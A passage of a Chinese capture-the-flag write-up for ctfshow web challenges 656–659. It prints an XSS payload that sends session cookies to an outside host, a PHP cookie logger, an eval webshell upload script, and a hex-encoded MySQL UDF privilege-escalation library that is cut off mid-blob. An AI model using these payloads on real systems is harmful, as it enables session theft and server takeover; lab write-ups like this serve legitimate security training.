</span></span><span class=line><span class=cl>    	<span class=o>.</span><span class=nv>$r</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>.</span>
</span></span><span class=line><span class=cl>    	<span class=s1>&#39;&lt;br&gt;------------&lt;br&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$html</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这边看到可以打一个<code>xss</code>,但是从哪里打呢又发现<code>username</code>和<code>password</code>有函数保护，所以用<code>xff</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>a=echo `curl -H &#39;X-Forwarded-For: &lt;script&gt;alert(1);&lt;/script&gt;&#39; http://172.2.41.3//index.php?action=login`;
</span></span></code></pre></td></tr></table></div></div><p>写文件把<code>cookie</code>打出来</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$content</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$content</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>     <span class=nx>file_put_contents</span><span class=p>(</span><span class=s1>&#39;cookie.txt&#39;</span><span class=p>,</span><span class=nv>$content</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>     <span class=k>echo</span> <span class=s1>&#39;nonono&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>img</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Image</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>img</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=s2>&#34;http://172.2.41.4/xss.php?1=&#34;</span><span class=o>+</span><span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>append</span><span class=p>(</span><span class=nx>img</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>echo &#39;PD9waHAKJGNvbnRlbnQgPSAkX0dFVFsxXTsKaWYoaXNzZXQoJGNvbnRlbnQpKXsKICAgICBmaWxlX3B1dF9jb250ZW50cygnY29va2llLnR4dCcsJGNvbnRlbnQpOwp9ZWxzZXsKICAgICBlY2hvICdub25vbm8nOwp9&#39;|base64 -d &gt; xss.php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>echo &#39;dmFyIGltZyA9IG5ldyBJbWFnZSgpOwppbWcuc3JjID0gImh0dHA6Ly8xNzIuMi40MS40L3hzcy5waHA/MT0iK2RvY3VtZW50LmNvb2tpZTsKZG9jdW1lbnQuYm9keS5hcHBlbmQoaW1nKTs=&#39;|base64 -d &gt; xss.js
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>select sys_eval(&#39;sudo curl -i -H &#34;X-Forwarded-For:&lt;script&gt;document.location=\&#39;http://172.2.41.4/xss.php?cookie=\&#39;%2bdocument.cookie;&lt;/script&gt;&#34;  http://172.2.41.5/index.php?action=login&#39;);
</span></span></code></pre></td></tr></table></div></div><p>X 出cookie了但是没有<code>flag</code>(拿别人的交了不小心点到提示还扣了我300分)</p><p>什么情况</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=p>)</span> <span class=o>$</span> <span class=n>cat</span> <span class=n>cookie</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=n>PHPSESSID</span><span class=o>=</span><span class=n>v8qgc9jfofr940r74jqmolt2k1</span><span class=p>;</span> <span class=n>auth</span><span class=o>=</span><span class=n>ZmxhZ182NTY9Y3Rmc2hvd3tlMGI4MGQ2Yjk5ZDJiZGJhZTM2ZjEyMWY3OGFiZTk2Yn0</span><span class=o>=</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=web657>web657</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>getFlag</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span>  <span class=nx>FLAG_657</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>main</span><span class=p>(</span><span class=nv>$m</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ret</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;code&#39;</span><span class=o>=&gt;</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;message&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;数据获取失败&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;login&#39;</span><span class=p>]</span><span class=o>==</span><span class=k>true</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		
</span></span><span class=line><span class=cl>		<span class=k>switch</span> <span class=p>(</span><span class=nv>$m</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>case</span> <span class=s1>&#39;getFlag&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>				<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=nx>getFlag</span><span class=p>();</span>
</span></span><span class=line><span class=cl>				<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=k>case</span> <span class=s1>&#39;testFile&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>				<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=nx>testFile</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;f&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>				<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>				<span class=c1># code...
</span></span></span><span class=line><span class=cl><span class=c1></span>				<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=s1>&#39;请先登陆&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>那么带着<code>cookie</code>上就行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=p>)</span> <span class=o>$</span> <span class=n>curl</span> <span class=o>-</span><span class=n>H</span> <span class=s1>&#39;Cookie:PHPSESSID=v8qgc9jfofr940r74jqmolt2k1; auth=ZmxhZ182NTY9Y3Rmc2hvd3tlMGI4MGQ2Yjk5ZDJiZGJhZTM2ZjEyMWY3OGFiZTk2Yn0=&#39;</span> <span class=s1>&#39;172.2.41.5/index.php?action=main&amp;m=getFlag&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=o>%</span> <span class=n>Total</span>    <span class=o>%</span> <span class=n>Received</span> <span class=o>%</span> <span class=n>Xferd</span>  <span class=n>Average</span> <span class=n>Speed</span>   <span class=n>Time</span>    <span class=n>Time</span>     <span class=n>Time</span>  <span class=n>Current</span>
</span></span><span class=line><span class=cl>                                 <span class=n>Dload</span>  <span class=n>Upload</span>   <span class=n>Total</span>   <span class=n>Spent</span>    <span class=n>Left</span>  <span class=n>Speed</span>
</span></span><span class=line><span class=cl>  <span class=mi>0</span>     <span class=mi>0</span>    <span class=mi>0</span>     <span class=mi>0</span>    <span class=mi>0</span>     <span class=mi>0</span>      <span class=mi>0</span>      <span class=mi>0</span> <span class=o>--</span><span class=p>:</span><span class=o>--</span><span class=p>:</span><span class=o>--</span> <span class=o>--</span><span class=p>:</span><span class=o>--</span><span class=p>:</span><span class=o>--</span> <span class=o>--</span><span class=p>:</span><span class=o>--</span><span class=p>:</span><span class=o>--</span>     <span class=mi>0</span> <span class=mi>100</span>    <span class=mi>73</span>    <span class=mi>0</span>    <span class=mi>73</span>    <span class=mi>0</span>     <span class=mi>0</span>  <span class=mi>73000</span>      <span class=mi>0</span> <span class=o>--</span><span class=p>:</span><span class=o>--</span><span class=p>:</span><span class=o>--</span> <span class=o>--</span><span class=p>:</span><span class=o>--</span><span class=p>:</span><span class=o>--</span> <span class=o>--</span><span class=p>:</span><span class=o>--</span><span class=p>:</span><span class=o>--</span> <span class=mi>73000</span>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;code&#34;</span><span class=p>:</span><span class=mi>0</span><span class=p>,</span><span class=s2>&#34;message&#34;</span><span class=p>:</span><span class=s2>&#34;flag_657=ctfshow{2a73f8f87a58a13c23818fafd83510b1}&#34;</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=web658>web658</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>testFile</span><span class=p>(</span><span class=nv>$f</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$result</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$file</span> <span class=o>=</span> <span class=nv>$f</span><span class=o>.</span><span class=nx>md5</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nx>random_int</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>10000</span><span class=p>))</span><span class=o>.</span><span class=nx>md5</span><span class=p>(</span><span class=nx>random_int</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>10000</span><span class=p>)))</span><span class=o>.</span><span class=s1>&#39;.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$file</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>		<span class=nv>$result</span> <span class=o>=</span> <span class=nx>FLAG_658</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nv>$result</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>爆破文件名</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>bind</span><span class=p>((</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=mi>21</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>listen</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;listening 0.0.0.0 21</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=p>,</span> <span class=n>addr</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>accept</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;220 a</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;230 a</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;200 a</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;200 a</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;200</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;200 a</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;200</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;200 a</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>echo &#39;aW1wb3J0IHNvY2tldApzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmJpbmQoKCcwLjAuMC4wJywgMjEpKQpzLmxpc3RlbigxKQpwcmludCgnbGlzdGVuaW5nIDAuMC4wLjAgMjFcbicpCmNvbm4sIGFkZHIgPSBzLmFjY2VwdCgpCmNvbm4uc2VuZChiJzIyMCBhXG4nKQpjb25uLnNlbmQoYicyMzAgYVxuJykKY29ubi5zZW5kKGInMjAwIGFcbicpCmNvbm4uc2VuZChiJzIwMCBhXG4nKQpjb25uLnNlbmQoYicyMDBcbicpCmNvbm4uc2VuZChiJzIwMCBhXG4nKQpjb25uLnNlbmQoYicyMDBcbicpCmNvbm4uc2VuZChiJzIwMCBhXG4nKQpjb25uLmNsb3NlKCkK&#39;|base64 -d &gt; 1.py
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python 1.py
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>curl -H &#39;PHPSESSID=v8qgc9jfofr940r74jqmolt2k1; auth=ZmxhZ182NTY9Y3Rmc2hvd3tlMGI4MGQ2Yjk5ZDJiZGJhZTM2ZjEyMWY3OGFiZTk2Yn0=&#39; &#39;172.2.41.5/index.php?action=main&amp;m=testFile&amp;f=ftp://172.2.41.4/a&#39;
</span></span></code></pre></td></tr></table></div></div><h1 id=web659>web659</h1><p>里面还有<code>robots.txt</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>curl</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>172.2</span><span class=o>.</span><span class=mf>41.5</span><span class=o>/</span><span class=n>robots</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=o>%</span> <span class=n>Total</span>    <span class=o>%</span> <span class=n>Received</span> <span class=o>%</span> <span class=n>Xferd</span>  <span class=n>Average</span> <span class=n>Speed</span>   <span class=n>Time</span>    <span class=n>Time</span>     <span class=n>Time</span>  <span class=n>Current</span>
</span></span><span class=line><span class=cl>                                 <span class=n>Dload</span>  <span class=n>Upload</span>   <span class=n>Total</span>   <span class=n>Spent</span>    <span class=n>Left</span>  <span class=n>Speed</span>
</span></span><span class=line><span class=cl>  <span class=mi>0</span>     <span class=mi>0</span>    <span class=mi>0</span>     <span class=mi>0</span>    <span class=mi>0</span>     <span class=mi>0</span>      <span class=mi>0</span>      <span class=mi>0</span> <span class=o>--</span><span class=p>:</span><span class=o>--</span><span class=p>:</span><span class=o>--</span> <span class=o>--</span><span class=p>:</span><span class=o>--</span><span class=p>:</span><span class=o>--</span> <span class=o>--</span><span class=p>:</span><span class=o>--</span><span class=p>:</span><span class=o>--</span>     <span class=mi>0</span> <span class=mi>100</span>    <span class=mi>19</span>  <span class=mi>100</span>    <span class=mi>19</span>    <span class=mi>0</span>     <span class=mi>0</span>   <span class=mi>6333</span>      <span class=mi>0</span> <span class=o>--</span><span class=p>:</span><span class=o>--</span><span class=p>:</span><span class=o>--</span> <span class=o>--</span><span class=p>:</span><span class=o>--</span><span class=p>:</span><span class=o>--</span> <span class=o>--</span><span class=p>:</span><span class=o>--</span><span class=p>:</span><span class=o>--</span>  <span class=mi>6333</span>
</span></span><span class=line><span class=cl><span class=n>disallowed</span> <span class=o>/</span><span class=n>public</span><span class=o>/</span>
</span></span></code></pre></td></tr></table></div></div><p>emm 靶机延时用完了，去找个脚本来写马</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://6ad980c6-186e-493f-8373-63593e72a9b6.challenge.ctf.show/&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>#模拟数据备份,写入木马</span>
</span></span><span class=line><span class=cl><span class=n>files</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;file&#39;</span><span class=p>:(</span><span class=s1>&#39;1.php&#39;</span><span class=p>,</span><span class=s2>&#34;&lt;?php eval($_POST[1]);?&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;application/octet-stream&#34;</span><span class=p>)}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#生成木马</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;system36d/users.php?action=upload&#34;</span><span class=p>,</span><span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>data1</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;key&#34;</span><span class=p>:</span><span class=s2>&#34;key_is_here_you_know&#34;</span><span class=p>,</span><span class=s2>&#34;file&#34;</span><span class=p>:</span><span class=s2>&#34;../db/data_you_never_know.db&#34;</span><span class=p>,</span><span class=s2>&#34;1&#34;</span><span class=p>:</span><span class=s2>&#34;file_put_contents(&#39;/var/www/html/a.php&#39;,&#39;&lt;?php eval($_POST[1]);?&gt;&#39;);&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;system36d/util/common.php?k=flag_651=ctfshow</span><span class=si>{a4c64b86d754b3b132a138e3e0adcaa6}</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#udf提权</span>
</span></span><span class=line><span class=cl><span class=n>data2</span><span class=o>=</span><span class=p>{</span> <span class=s1>&#39;1&#39;</span><span class=p>:</span><span class=s1>&#39;file_put_contents(</span><span class=se>\&#39;</span><span class=s1>udf.so</span><span class=se>\&#39;</span><span class=s1>,hex2bin(</span><span class=se>\&#39;</span><span class=s1>7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465